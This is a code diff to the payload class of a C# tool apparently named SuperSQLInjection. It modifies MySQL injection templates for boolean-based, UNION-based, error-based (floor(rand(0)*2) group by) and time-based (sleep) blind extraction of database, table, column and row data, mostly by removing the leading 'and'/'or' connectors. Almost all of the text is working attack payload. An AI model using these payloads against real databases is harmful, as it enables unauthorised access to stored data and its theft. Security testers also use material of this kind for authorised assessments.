@@ -35,13 +35,13 @@ namespace SuperSQLInjection.payload
         public static String mid_value = "(mid({data},{index},1))";
 
         //获取数据库数量bool方式
-        public static String bool_db_count = " and " + dbs_count + ">{len}";
+        public static String bool_db_count = " " + dbs_count + ">{len}";
 
         //获取表数量bool
-        public static String bool_tables_count = " and " + tables_count + ">{len}";
+        public static String bool_tables_count = " " + tables_count + ">{len}";
         
         //获取列数量bool
-        public static String bool_columns_count = " and " + columns_count + ">{len}";
+        public static String bool_columns_count = " " + columns_count + ">{len}";
         
 
         //多字符长度判断
@@ -51,16 +51,16 @@ namespace SuperSQLInjection.payload
         public static String ord_value = "(ord(mid({data},{index},1)))";
 
         //bool方式字符长度判断
-        public static String ver_length = " and "+ bool_length + ">{len}";
+        public static String ver_length = " "+ bool_length + ">{len}";
 
         //bool方式字符长度判断
         public static String char_len= "char_length({data})";
 
         //bool方式获取值
-        public static String ver_value = " and "+ bool_value + ">{len}";
+        public static String ver_value = " "+ bool_value + ">{len}";
 
         //bool方式获取值
-        public static String bool_ord_value = " and " + mid_value + ">{len}";
+        public static String bool_ord_value = " " + mid_value + ">{len}";
 
         //获取行数据bool
         public static String data_value = "(select {columns} from {dbname}.{table} limit {limit},1)";
@@ -70,13 +70,13 @@ namespace SuperSQLInjection.payload
         //union获取数据条数
         public static String data_count = "(select count(*) from {dbname}.{table})";
         //bool判断数据条数
-        public static String bool_datas_count = " and " + data_count + ">={len}";
+        public static String bool_datas_count = " " + data_count + ">={len}";
 
         //union获取值
-        public static String union_value = " and 1=2 union all select {data}";
+        public static String union_value = " 1=2 union all select {data}";
 
         //error方式
-        public static String error_value = " or (select 1 from (select count(*),concat(({data}),floor(rand(0)*2))x from information_schema.tables group by x)a)";
+        public static String error_value = " (select 1 from (select count(*),concat(({data}),floor(rand(0)*2))x from information_schema.tables group by x)a)";
         
         public static String hex = "(select hex({data}))";
         public static String hex_value = "(select hex(convert(({data}) using UTF8)))";
@@ -84,7 +84,7 @@ namespace SuperSQLInjection.payload
         public static String substr_value = "(select substr({data},{start},{len}))";
         public static String getBoolCountBySleep(String data,int maxTime)
         {    
-            return " and (select * from (select(sleep("+ maxTime + "-(if(("+data+ ">{len}), 0, " + maxTime + ")))))"+Tools.RandStr(4)+")";
+            return " (select * from (select(sleep("+ maxTime + "-(if(("+data+ ">{len}), 0, " + maxTime + ")))))"+Tools.RandStr(4)+")";
         }
 
         /// <summary>
